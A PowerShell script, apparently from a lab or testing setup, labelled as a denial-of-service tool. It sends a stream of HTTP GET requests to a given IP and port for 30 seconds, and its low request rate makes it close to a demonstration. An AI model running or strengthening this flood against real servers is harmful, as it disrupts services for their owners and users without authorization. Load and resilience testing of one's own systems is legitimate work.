# DoS Attack Script (Windows)
# Usage: .\dos_attack.ps1 TARGET
# Target can be IP:PORT, http://IP:PORT, or just IP (defaults to port 80)

param(
    [Parameter(Mandatory=$true)]
    [string]$Target
)

# Parse target - handle IP:PORT format
if ($Target -match '^(.+):(\d+)$') {
    $TargetIP = $matches[1]
    $Port = [int]$matches[2]
} elseif ($Target -match '^https?://(.+):(\d+)') {
    $TargetIP = $matches[1]
    $Port = [int]$matches[2]
} elseif ($Target -match '^https?://(.+)') {
    $TargetIP = $matches[1]
    $Port = 80
} else {
    $TargetIP = $Target
    $Port = 80
}

# Default duration
$Duration = 30

Write-Host "Starting DoS Attack on ${TargetIP}:${Port} for $Duration seconds..." -ForegroundColor Yellow
Write-Host "WARNING: This is for authorized testing only!" -ForegroundColor Red

$endTime = (Get-Date).AddSeconds($Duration)
$requestCount = 0
$errorCount = 0

try {
    while ((Get-Date) -lt $endTime) {
        try {
            # Create TCP connection
            $tcpClient = New-Object System.Net.Sockets.TcpClient
            $tcpClient.Connect($TargetIP, $Port)
            $stream = $tcpClient.GetStream()
            
            # Send HTTP GET request
            $request = "GET / HTTP/1.1`r`nHost: ${TargetIP}`r`nConnection: close`r`n`r`n"
            $bytes = [System.Text.Encoding]::ASCII.GetBytes($request)
            $stream.Write($bytes, 0, $bytes.Length)
            
            $tcpClient.Close()
            $requestCount++
            
            if ($requestCount % 10 -eq 0) {
                Write-Host "Sent $requestCount requests..." -ForegroundColor Cyan
            }
        } catch {
            $errorCount++
        }
        
        Start-Sleep -Milliseconds 100
    }
    
    Write-Host "`nDoS Attack completed!" -ForegroundColor Green
    Write-Host "Total requests sent: $requestCount" -ForegroundColor Cyan
    Write-Host "Errors: $errorCount" -ForegroundColor Yellow
    
    exit 0
} catch {
    Write-Host "Error: $_" -ForegroundColor Red
    exit 1
}
